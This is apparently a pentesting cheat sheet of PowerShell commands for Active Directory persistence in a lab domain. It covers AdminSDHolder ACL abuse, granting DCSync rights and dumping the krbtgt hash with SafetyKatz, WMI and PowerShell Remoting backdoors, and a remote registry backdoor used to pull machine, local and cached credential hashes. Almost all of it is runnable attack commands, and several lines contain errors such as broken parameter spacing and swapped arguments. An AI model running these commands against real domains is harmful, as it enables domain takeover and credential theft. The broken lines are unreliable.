# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerView

### AdminSDHolder
**Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:** 
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=contoso,dc=local' -PrincipalIdentity studentuser1 -Rights All -PrincipalDomain contoso.local -TargetDomain techcorp.local -Verbose
```

**ResetPassword permission:**
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=Systems,dc=contoso,dc=local' - PrincipalIdentity studentuser1 -Rights ResetPassword - PrincipalDomain us.contoso.local -TargetDomain us.contoso.local - Verbose
```

**Use [Invoke-SDPropagator.ps1](https://github.com/theyoge/AD-Pentesting-Tools/blob/main/Invoke-SDPropagator.ps1) to manually run SDProp:**
```powershell
# Post-Server 2008 machines:
Invoke-SDPropagator -timeoutMinutes 1 -showProgress - Verbose

# Pre-Server 2008 machines:
Invoke-SDPropagator -taskname FixUpInheritance - timeoutMinutes 1 -showProgress -Verbose
```

**Check if permissions were added correctly:**
```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' - ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser1"}
```

**FullControl abuse:**
```powershell
# PowerView
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

# Native PowerShell
Net group "domain admins" testda /add /domain
```

**ResetPassword abuse:**
```powershell
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText - Force) -Verbose
```

### DCSync

**Add FullControl permissions for a user to the domain using PowerView as DA:**
```powershell
Add-DomainObjectAcl -TargetIdentity "dc=contoso,dc=local" -PrincipalIdentity studentuser1 -Rights All -PrincipalDomain contoso.local -TargetDomain contoso.local -Verbose
```

**DCSync permission:**
```powershell
Add-DomainObjectAcl -TargetIdentity "dc=contoso,dc=local" -PrincipalIdentity studentuser1 -Rights DCSync -PrincipalDomain contoso.local -TargetDomain contoso.local -Verbose
```

**Execute DCSync and dump krbtgt:**
```powershell
SafetyKatz.exe "lsadump::dcsync /user:contoso\krbtgt" "exit"
```

### WMI
https://github.com/samratashok/RACE

**On a local machine:**
```powershell
Set-RemoteWMI -Username studentuser1 -Verbose
```

**On a remote machine without explicit credentials:**
```powershell
Set-RemoteWMI -Username studentuser1 -Computername us-dc -namespace ‘root\cimv2’ -Verbose
```

**On a remote machine with explicit credentials, only root/cimv and nested namespaces:**

```powershell
Set-RemoteWMI -Username studentuser1 -Computername us-dc -Credential Administrator -namespace ‘root\cimv2’ -Verbose
```

**On remote machine remove permissions:** 
```powershell
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Remove
```

### PowerShell Remoting

**On a local machine:**  
```powershell
Set-RemotePSRemoting -Username studentuser1 -Verbose
```

**On a remote machine without credentials:**  
```powershell
Set-RemotePSRemoting -Username studentuser1 -Computername us-dc -Verbose
```

**On a remote machine remove permissions:**  
```powershell
Set-RemotePSRemoting -Username studentuser1 -Computername us-dc -Remove
```

### Remote Registry 

**Using DAMP with admin privs on remote machine:**  
```powershell
Add-RemoteRegBackdoor -Computername studentuser1 -Trustee us-dc -Verbose
```

**Retrieve machine account hash from local machine:**  
```powershell
Get-RemoteMachineAccountHash -Computername us-dc -Verbose
```

**Retrieve local account hash from local machine:**  
```powershell
Get-RemoteLocalAccountHash -Computername us-dc -Verbose
```

**Retrieve domain cached credentials from local machine:**  
```powershell
Get-RemoteCachedCredential -Computername us-dc -Verbose
```
